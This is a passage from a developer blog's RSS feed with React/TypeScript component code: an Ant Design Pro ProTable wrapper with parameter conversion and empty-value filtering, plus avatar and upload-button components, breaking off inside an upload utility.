<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Components</title>
      <link>https://www.matrixtheone.ga/web/note/React/Components/</link>
      <guid>https://www.matrixtheone.ga/web/note/React/Components/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Components</source>
      <category>React</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-protable"> 1. ProTable</h2>
<ul>
<li>基于 Ant-Pro 封装，新增删除最后一项自动翻页、参数字段名称转换，修复 ProTable 清空时为空字符串和空数组的 BUG。</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> useRef <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> ProTable <span>as</span> AntProTable <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> <span>type</span> <span>{</span> ActionType <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> <span>type</span> <span>{</span> ProTableProps <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> <span>type</span> <span>{</span> IProps<span>,</span> ParamsType<span>,</span> RequiredPick <span>}</span> <span>from</span> <span>'./interface'</span>
<span>import</span> <span>{</span> generateParams<span>,</span> safeGetValue <span>}</span> <span>from</span> <span>'./utils'</span>

<span>const</span> defaultConvertParams <span>=</span> <span>{</span>
  current<span>:</span> <span>'current'</span><span>,</span>
  pageSize<span>:</span> <span>'pageSize'</span><span>,</span>
  data<span>:</span> <span>'data'</span><span>,</span>
  total<span>:</span> <span>'total'</span><span>,</span>
  success<span>:</span> <span>'success'</span><span>,</span>
<span>}</span>

<span>const</span> ProTable <span>=</span> <span>&lt;</span>
  DataType <span>extends</span> <span>Record<span>&lt;</span><span>string</span><span>,</span> <span>any</span><span>></span></span><span>,</span>
  Params <span>extends</span> <span>ParamsType</span> <span>=</span> ParamsType<span>,</span>
  ValueType <span>=</span> <span>'text'</span><span>,</span>
<span>></span><span>(</span><span>{</span>
  request<span>,</span>
  actionRef<span>,</span>
  convertParams<span>,</span>
  filterNullValues <span>=</span> <span>true</span><span>,</span>
  <span>...</span>rest
<span>}</span><span>:</span> ProTableProps<span>&lt;</span>DataType<span>,</span> Params<span>,</span> ValueType<span>></span> <span>&amp;</span>
  RequiredPick<span>&lt;</span>ProTableProps<span>&lt;</span>DataType<span>,</span> Params<span>,</span> ValueType<span>></span><span>,</span> <span>'request'</span><span>></span> <span>&amp;</span>
  IProps<span>)</span> <span>=></span> <span>{</span>
  <span>const</span> innerActionRef <span>=</span> <span><span>useRef</span><span><span>&lt;</span>ActionType<span>></span></span></span><span>(</span><span>)</span>
  <span>const</span> proActionRef <span>=</span>
    <span>(</span>actionRef <span>as</span> ReturnType<span>&lt;</span><span>typeof</span> useRef<span>&lt;</span>ActionType<span>>></span><span>)</span> <span>||</span> innerActionRef

  <span>return</span> <span>(</span>
    <span>&lt;</span>AntProTable<span>&lt;</span>DataType<span>,</span> Params<span>,</span> ValueType<span>></span>
      rowKey<span>=</span><span>'id'</span>
      cardBordered
      defaultSize<span>=</span><span>'large'</span>
      dateFormatter<span>=</span><span>'string'</span>
      actionRef<span>=</span><span>{</span>proActionRef<span>}</span>
      form<span>=</span><span>{</span><span>{</span> ignoreRules<span>:</span> <span>false</span> <span>}</span><span>}</span>
      editable<span>=</span><span>{</span><span>{</span> type<span>:</span> <span>'multiple'</span> <span>}</span><span>}</span>
      pagination<span>=</span><span>{</span><span>{</span> defaultPageSize<span>:</span> <span>10</span> <span>}</span><span>}</span>
      request<span>=</span><span>{</span><span>async</span> <span>(</span>params<span>,</span> <span>...</span>restParams<span>)</span> <span>=></span> <span>{</span>
        <span>const</span> mergeParams <span>=</span> <span>{</span> <span>...</span>defaultConvertParams<span>,</span> <span>...</span>convertParams <span>}</span>
        <span>const</span> <span>{</span> success<span>,</span> data<span>,</span> total <span>}</span> <span>=</span> mergeParams
        <span>const</span> gParams <span>=</span> <span>generateParams</span><span>(</span>
          params<span>,</span>
          mergeParams<span>,</span>
          filterNullValues<span>,</span>
        <span>)</span> <span>as</span> Params

        <span>const</span> res <span>=</span> <span>await</span> <span>request</span><span>(</span>gParams<span>,</span> <span>...</span>restParams<span>)</span>
        <span>const</span> safeData <span>=</span> <span><span>safeGetValue</span><span><span>&lt;</span>DataType<span>[</span><span>]</span><span>></span></span></span><span>(</span>res<span>,</span> data<span>,</span> <span>[</span><span>]</span><span>)</span>

        <span>// 删除最后一项自动翻页</span>
        <span>if</span> <span>(</span><span>!</span>safeData<span>.</span>length <span>&amp;&amp;</span> <span>(</span>params<span>.</span>current <span>||</span> <span>1</span><span>)</span> <span>></span> <span>1</span><span>)</span> <span>{</span>
          proActionRef<span>.</span>current<span>!</span><span>.</span>pageInfo<span>!</span><span>.</span>current <span>-=</span> <span>1</span>
        <span>}</span>

        <span>return</span> <span>{</span>
          data<span>:</span> safeData<span>,</span>
          total<span>:</span> <span><span>safeGetValue</span><span><span>&lt;</span><span>number</span><span>></span></span></span><span>(</span>res<span>,</span> total<span>,</span> safeData<span>.</span>length<span>)</span><span>,</span>
          success<span>:</span> <span><span>safeGetValue</span><span><span>&lt;</span><span>boolean</span><span>></span></span></span><span>(</span>res<span>,</span> success<span>,</span> <span>false</span><span>)</span><span>,</span>
        <span>}</span>
      <span>}</span><span>}</span>
      <span>{</span><span>...</span>rest<span>}</span>
    <span>/</span><span>></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> ProTable
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br></div></div><ul>
<li>utils</li>
</ul>
<div><pre><code><span>import</span> <span>type</span> <span>{</span> MergeParams<span>,</span> Params <span>}</span> <span>from</span> <span>'./interface'</span>

<span>export</span> <span>const</span> generateParams <span>=</span> <span>(</span>
  params<span>:</span> Params<span>,</span>
  mergeParams<span>:</span> MergeParams<span>,</span>
  filterNullValues<span>:</span> <span>boolean</span><span>,</span>
<span>)</span><span>:</span> Params <span>=></span> <span>{</span>
  <span>const</span> <span>{</span> current<span>,</span> pageSize<span>,</span> <span>...</span>rest <span>}</span> <span>=</span> params
  <span>const</span> filterParams <span>=</span> Object<span>.</span><span>entries</span><span>(</span>rest<span>)</span><span>.</span><span>reduce</span><span>(</span><span>(</span>acc<span>,</span> <span>[</span>key<span>,</span> value<span>]</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span><span>(</span><span>typeof</span> value <span>===</span> <span>'string'</span> <span>||</span> <span>Array</span><span>.</span><span>isArray</span><span>(</span>value<span>)</span><span>)</span> <span>&amp;&amp;</span> <span>!</span>value<span>?.</span>length<span>)</span> <span>{</span>
      <span>return</span> acc
    <span>}</span>

    <span>return</span> <span>{</span> <span>...</span>acc<span>,</span> <span>[</span>key<span>]</span><span>:</span> value <span>}</span>
  <span>}</span><span>,</span> <span>{</span><span>}</span><span>)</span>

  <span>return</span> <span>{</span>
    <span>[</span>mergeParams<span>.</span>current<span>]</span><span>:</span> current<span>,</span>
    <span>[</span>mergeParams<span>.</span>pageSize<span>]</span><span>:</span> pageSize<span>,</span>
    <span>...</span><span>(</span>filterNullValues <span>?</span> filterParams <span>:</span> rest<span>)</span><span>,</span>
  <span>}</span>
<span>}</span>

<span>export</span> <span>const</span> safeGetValue <span>=</span> <span>&lt;</span><span>T</span><span>,</span><span>></span><span>(</span>
  source<span>:</span> Record<span>&lt;</span><span>string</span><span>,</span> <span>any</span><span>></span><span>,</span>
  prop<span>:</span> <span>string</span><span>,</span>
  underwriteValue<span>?</span><span>:</span> <span>any</span><span>,</span>
<span>)</span><span>:</span> <span>T</span> <span>=></span> <span>{</span>
  <span>const</span> keys <span>=</span> prop<span>.</span><span>split</span><span>(</span><span>'.'</span><span>)</span>
  <span>let</span> res<span>:</span> <span>any</span> <span>=</span> source

  keys<span>.</span><span>forEach</span><span>(</span>k <span>=></span> <span>{</span>
    <span>const</span> curData <span>=</span> res<span>?.</span><span>[</span>k<span>]</span>
    res <span>=</span> curData <span>||</span> underwriteValue
  <span>}</span><span>)</span>

  <span>return</span> res
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br></div></div><ul>
<li>interface</li>
</ul>
<div><pre><code><span>export</span> <span>type</span> <span>ParamsType</span> <span>=</span> Record<span>&lt;</span><span>string</span><span>,</span> <span>any</span><span>></span>
<span>export</span> <span>type</span> <span>RequiredPick<span>&lt;</span><span>T</span><span>,</span> <span>K</span> <span>extends</span> <span>keyof</span> <span>T</span><span>></span></span> <span>=</span> Required<span>&lt;</span>Pick<span>&lt;</span><span>T</span><span>,</span> <span>K</span><span>>></span>
<span>export</span> <span>type</span> <span>FilterUndefined<span>&lt;</span><span>T</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span><span>undefined</span></span> <span>?</span> <span>never</span> <span>:</span> <span>T</span>

<span>export</span> <span>type</span> <span>IProps</span> <span>=</span> Partial<span>&lt;</span><span>{</span>
  <span>/**
   * @name 转换参数
   * @desc 可链式取值
   * @example { total: count }
   * @example { data: data.list }
   */</span>
  convertParams<span>:</span> Partial<span>&lt;</span><span>{</span>
    current<span>:</span> <span>string</span>
    pageSize<span>:</span> <span>string</span>
    data<span>:</span> <span>string</span>
    total<span>:</span> <span>string</span>
    success<span>:</span> <span>string</span>
  <span>}</span><span>></span>
  <span>/**
   * @name 过滤空值
   * @desc 过滤ProTable清空时，出现的空字符串与空数组
   */</span>
  filterNullValues<span>:</span> <span>boolean</span>
<span>}</span><span>></span>

<span>export</span> <span>type</span> <span>Params</span> <span>=</span> ParamsType <span>&amp;</span> <span>{</span>
  pageSize<span>?</span><span>:</span> <span>number</span> <span>|</span> <span>undefined</span>
  current<span>?</span><span>:</span> <span>number</span> <span>|</span> <span>undefined</span>
  keyword<span>?</span><span>:</span> <span>string</span> <span>|</span> <span>undefined</span>
<span>}</span>

<span>export</span> <span>type</span> <span>MergeParams</span> <span>=</span> FilterUndefined<span>&lt;</span>Required<span>&lt;</span>IProps<span>[</span><span>'convertParams'</span><span>]</span><span>>></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></div></div><h2 id="_2-upload"> 2. Upload</h2>
<ul>
<li>UploadAvatar</li>
</ul>
<div><pre><code><span>import</span> React<span>,</span> <span>{</span> useState <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> Upload <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>type</span> <span>{</span> UploadProps <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>{</span> LoadingOutlined<span>,</span> PlusOutlined <span>}</span> <span>from</span> <span>'@ant-design/icons'</span>
<span>import</span> <span>{</span> customRequest<span>,</span> generateBeforeUpload<span>,</span> getBase64 <span>}</span> <span>from</span> <span>'./utils'</span>

<span>export</span> <span>type</span> <span>UploadAvatarProps</span> <span>=</span> UploadProps <span>&amp;</span> <span>{</span>
  <span>/**
   * @name 图片链接
   */</span>
  value<span>?</span><span>:</span> <span>string</span>
  onChange<span>?</span><span>:</span> <span>(</span>url<span>:</span> <span>string</span><span>)</span> <span>=></span> <span>void</span>
  <span>/**
   * @name 上传图片类型
   * @default ['jpg', 'png', 'webp']
   */</span>
  fileType<span>?</span><span>:</span> <span>string</span><span>[</span><span>]</span> <span>|</span> <span>null</span>
  <span>/**
   * @name 限制上传图片大小
   * @desc 单位：M
   * @default 5
   */</span>
  fileSize<span>?</span><span>:</span> <span>number</span> <span>|</span> <span>null</span>
<span>}</span>

<span>const</span> UploadAvatar<span>:</span> React<span>.</span><span>FC</span><span>&lt;</span>UploadAvatarProps<span>></span> <span>=</span> <span>(</span><span>{</span>
  value<span>,</span>
  onChange<span>,</span>
  fileType <span>=</span> <span>[</span><span>'jpg'</span><span>,</span> <span>'png'</span><span>,</span> <span>'webp'</span><span>]</span><span>,</span>
  fileSize <span>=</span> <span>5</span><span>,</span>
  children<span>,</span>
  <span>...</span>rest
<span>}</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> <span>[</span>loading<span>,</span> setLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span>
  <span>const</span> <span>[</span>imageUrl<span>,</span> setImageUrl<span>]</span> <span>=</span> <span><span>useState</span><span><span>&lt;</span><span>string</span> <span>|</span> <span>undefined</span><span>></span></span></span><span>(</span>value<span>)</span>

  <span>const</span> handleChange<span>:</span> UploadProps<span>[</span><span>'onChange'</span><span>]</span> <span>=</span> <span>async</span> <span>(</span><span>{</span> file <span>}</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> status<span>,</span> originFileObj<span>,</span> response <span>}</span> <span>=</span> file
    <span>if</span> <span>(</span>status <span>===</span> <span>'uploading'</span><span>)</span> <span>{</span>
      <span>setLoading</span><span>(</span><span>true</span><span>)</span>
    <span>}</span>

    <span>if</span> <span>(</span>status <span>===</span> <span>'done'</span><span>)</span> <span>{</span>
      <span>const</span> url <span>=</span> <span>await</span> <span>getBase64</span><span>(</span>originFileObj<span>!</span><span>)</span>
      <span>setLoading</span><span>(</span><span>false</span><span>)</span>
      <span>setImageUrl</span><span>(</span>url<span>)</span>
      onChange<span>?.</span><span>(</span>response<span>)</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>Upload</span></span>
      <span>listType</span><span><span>=</span><span>'</span>picture-card<span>'</span></span>
      <span>showUploadList</span><span><span>=</span><span>{</span><span>false</span><span>}</span></span>
      <span>customRequest</span><span><span>=</span><span>{</span>customRequest<span>}</span></span>
      <span>beforeUpload</span><span><span>=</span><span>{</span><span>generateBeforeUpload</span><span>(</span><span>{</span> fileType<span>,</span> fileSize <span>}</span><span>)</span><span>}</span></span>
      <span>onChange</span><span><span>=</span><span>{</span>handleChange<span>}</span></span>
      <span><span>{</span><span>...</span>rest<span>}</span></span>
    <span>></span></span><span>
      </span><span>{</span>React<span>.</span>Children<span>.</span><span>toArray</span><span>(</span>children<span>)</span><span>.</span>length <span>?</span> <span>(</span>
        React<span>.</span><span>cloneElement</span><span>(</span>children <span>as</span> <span>JSX</span><span>.</span>Element<span>,</span> <span>{</span> loading<span>,</span> imageUrl <span>}</span><span>)</span>
      <span>)</span> <span>:</span> imageUrl <span>?</span> <span>(</span>
        <span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>{</span>imageUrl<span>}</span></span> <span>alt</span><span><span>=</span><span>{</span>imageUrl<span>}</span></span> <span>style</span><span><span>=</span><span>{</span><span>{</span> width<span>:</span> <span>'100%'</span> <span>}</span><span>}</span></span> <span>/></span></span>
      <span>)</span> <span>:</span> <span>(</span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span>
          </span><span>{</span>loading <span>?</span> <span><span><span>&lt;</span><span>LoadingOutlined</span></span> <span>/></span></span> <span>:</span> <span><span><span>&lt;</span><span>PlusOutlined</span></span> <span>/></span></span><span>}</span><span>
          </span><span><span><span>&lt;</span>div</span> <span>style</span><span><span>=</span><span>{</span><span>{</span> marginTop<span>:</span> <span>8</span> <span>}</span><span>}</span></span><span>></span></span><span>Upload</span><span><span><span>&lt;/</span>div</span><span>></span></span><span>
        </span><span><span><span>&lt;/</span>div</span><span>></span></span>
      <span>)</span><span>}</span><span>
    </span><span><span><span>&lt;/</span><span>Upload</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> UploadAvatar
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br></div></div><ul>
<li>ProFormUploadAvatar</li>
</ul>
<div><pre><code><span>import</span> <span>type</span> <span>{</span> ProFormItemProps <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> <span>{</span> ProForm <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> UploadAvatar <span>from</span> <span>'./UploadAvatar'</span>
<span>import</span> <span>type</span> <span>{</span> UploadAvatarProps <span>}</span> <span>from</span> <span>'./UploadAvatar'</span>

<span>type</span> <span>ProFormUploadAvatarProps</span> <span>=</span> ProFormItemProps <span>&amp;</span> <span>{</span>
  fieldProps<span>?</span><span>:</span> UploadAvatarProps
<span>}</span>

<span>const</span> ProFormUploadAvatar<span>:</span> React<span>.</span><span>FC</span><span>&lt;</span>ProFormUploadAvatarProps<span>></span> <span>=</span> <span>(</span><span>{</span>
  fieldProps<span>,</span>
  children<span>,</span>
  <span>...</span>rest
<span>}</span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>ProForm.Item</span></span> <span><span>{</span><span>...</span>rest<span>}</span></span><span>></span></span><span>
      </span><span><span><span>&lt;</span><span>UploadAvatar</span></span> <span>children</span><span><span>=</span><span>{</span>children<span>}</span></span> <span><span>{</span><span>...</span>fieldProps<span>}</span></span> <span>/></span></span><span>
    </span><span><span><span>&lt;/</span><span>ProForm.Item</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> ProFormUploadAvatar
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><ul>
<li>ProFormUploadButton</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> useState <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> Modal <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>type</span> <span>{</span> UploadProps <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>type</span> <span>{</span> ModalProps <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>{</span> ProFormUploadButton <span>as</span> AntProFormUploadButton <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> <span>type</span> <span>{</span> ProFormUploadButtonProps <span>as</span> AntProFormUploadButtonProps <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> <span>{</span> customRequest<span>,</span> generateBeforeUpload<span>,</span> getBase64 <span>}</span> <span>from</span> <span>'./utils'</span>
<span>import</span> <span>{</span> saveAs <span>}</span> <span>from</span> <span>'file-saver'</span>

<span>type</span> <span>ProFormUploadButtonProps</span> <span>=</span> AntProFormUploadButtonProps <span>&amp;</span> <span>{</span>
  <span>/**
   * @name 上传图片类型
   * @default ['jpg', 'png', 'webp']
   */</span>
  fileType<span>?</span><span>:</span> <span>string</span><span>[</span><span>]</span> <span>|</span> <span>null</span>
  <span>/**
   * @name 限制上传图片大小
   * @desc 单位：M
   * @default 5
   */</span>
  fileSize<span>?</span><span>:</span> <span>number</span> <span>|</span> <span>null</span>
  fieldProps<span>?</span><span>:</span> UploadProps
  <span>/**
   * @name 图片预览对话框
   */</span>
  modalProps<span>?</span><span>:</span> ModalProps
<span>}</span>

<span>const</span> ProFormUploadButton<span>:</span> React<span>.</span><span>FC</span><span>&lt;</span>ProFormUploadButtonProps<span>></span> <span>=</span> <span>(</span><span>{</span>
  fileType <span>=</span> <span>[</span><span>'jpg'</span><span>,</span> <span>'png'</span><span>,</span> <span>'webp'</span><span>]</span><span>,</span>
  fileSize <span>=</span> <span>5</span><span>,</span>
  fieldProps<span>,</span>
  modalProps<span>,</span>
  <span>...</span>rest
<span>}</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> <span>[</span>visible<span>,</span> setVisible<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span>
  <span>const</span> <span>[</span>previewImg<span>,</span> setPreviewImg<span>]</span> <span>=</span> <span><span>useState</span><span><span>&lt;</span><span>string</span><span>></span></span></span><span>(</span><span>)</span>

  <span>const</span> onPreview<span>:</span> UploadProps<span>[</span><span>'onPreview'</span><span>]</span> <span>=</span> <span>async</span> file <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>file<span>.</span>type<span>?.</span><span>startsWith</span><span>(</span><span>'image'</span><span>)</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>!</span>file<span>.</span>url <span>&amp;&amp;</span> <span>!</span>file<span>.</span>preview<span>)</span> <span>{</span>
        file<span>.</span>preview <span>=</span> <span>await</span> <span>getBase64</span><span>(</span>file<span>.</span>originFileObj<span>!</span><span>)</span>
      <span>}</span>
      <span>setPreviewImg</span><span>(</span>file<span>.</span>url <span>||</span> file<span>.</span>preview<span>)</span>
      <span>setVisible</span><span>(</span><span>true</span><span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>saveAs</span><span>(</span>file<span>.</span>originFileObj <span>as</span> File<span>,</span> file<span>.</span>originFileObj<span>?.</span>name<span>)</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> onChange<span>:</span> UploadProps<span>[</span><span>'onChange'</span><span>]</span> <span>=</span> <span>(</span><span>{</span> fileList <span>}</span><span>)</span> <span>=></span> <span>{</span>
    <span>return</span> fileList<span>.</span><span>map</span><span>(</span>file <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>!</span>file<span>.</span>status<span>)</span> file<span>.</span>status <span>=</span> <span>'error'</span>
      <span>return</span> file
    <span>}</span><span>)</span>
  <span>}</span>

  <span>const</span> beforeUpload <span>=</span> <span>generateBeforeUpload</span><span>(</span><span>{</span> fileType<span>,</span> fileSize <span>}</span><span>)</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span></span><span>></span></span><span>
      </span><span><span><span>&lt;</span><span>AntProFormUploadButton</span></span>
        <span>max</span><span><span>=</span><span>{</span><span>1</span><span>}</span></span>
        <span>fieldProps</span><span><span>=</span><span>{</span><span>{</span>
          name<span>:</span> <span>'file'</span><span>,</span>
          listType<span>:</span> <span>'picture-card'</span><span>,</span>
          customRequest<span>,</span>
          beforeUpload<span>,</span>
          onPreview<span>,</span>
          onChange<span>,</span>
          <span>...</span>fieldProps<span>,</span>
        <span>}</span><span>}</span></span>
        <span><span>{</span><span>...</span>rest<span>}</span></span>
      <span>/></span></span><span>

      </span><span><span><span>&lt;</span><span>Modal</span></span>
        <span>visible</span><span><span>=</span><span>{</span>visible<span>}</span></span>
        <span>footer</span><span><span>=</span><span>{</span><span>null</span><span>}</span></span>
        <span>onCancel</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>setVisible</span><span>(</span><span>false</span><span>)</span><span>}</span></span>
        <span>width</span><span><span>=</span><span>'</span>50%<span>'</span></span>
        <span><span>{</span><span>...</span>modalProps<span>}</span></span>
      <span>></span></span><span>
        </span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>{</span>previewImg<span>}</span></span> <span>alt</span><span><span>=</span><span>{</span>previewImg<span>}</span></span> <span>style</span><span><span>=</span><span>{</span><span>{</span> width<span>:</span> <span>'100%'</span> <span>}</span><span>}</span></span> <span>/></span></span><span>
      </span><span><span><span>&lt;/</span><span>Modal</span></span><span>></span></span><span>
    </span><span><span><span>&lt;/</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> ProFormUploadButton
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br></div></div><ul>
<li>utils</li>
</ul>
<div><pre><code><span>import</span> <span>type</span> <span>{</span> UploadProps <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>{</span> message <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>{</span> lookup <span>}</span> <span>from</span> <span>'mime-types'</span>
<span>import</span> <span>{</span> UploadImage <span>}</span> <span>from</span> <span>'@/services/pusheng/OtherService'</span>

<span>export</span> <span>const</span> getBase64 <span>=</span> <span>(</span>file<span>:</span> File<span>)</span><span>:</span> <span>Promise</span><span>&lt;</span><span>string</span><span>></span> <span>=></span> <span>{</span>
  <span>return</span> <span>new</span> <span><span>Promise</span></span><span>(</span><span>(</span>resolve<span>,</span> reject<span>)</span> <span>=></span> <span>{</span>
    <span>const</span> reader <span>=</span> <span>new</span> <span>FileReader</span><span>(</span><span>)</span>
    reader<span>.</span><span>readAsDataURL</span><span>(</span>file<span>)</span>
    reader<span>.</span><span>onload</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>resolve</span><span>(</span>reader<span>.</span>result <span>as</span> <span>string</span><span>)</span>
    reader<span>.</span>onerror <span>=</span> reject
  <span>}</span><span>)</span>
<span>}</span>

<span>export</span> <span>const</span> customRequest<span>:</span> UploadProps<span>[</span><span>'customRequest'</span><span>]</span> <span>=</span> <span>(</span><span>{</span>
  file<span>,</span>
  filename<span>,</span>
  onSuccess<span>,</span>
  onProgress<span>,</span>
  onError<span>,</span>
<span>}</span><span>)</span> <span>=></span> <span>{</span>
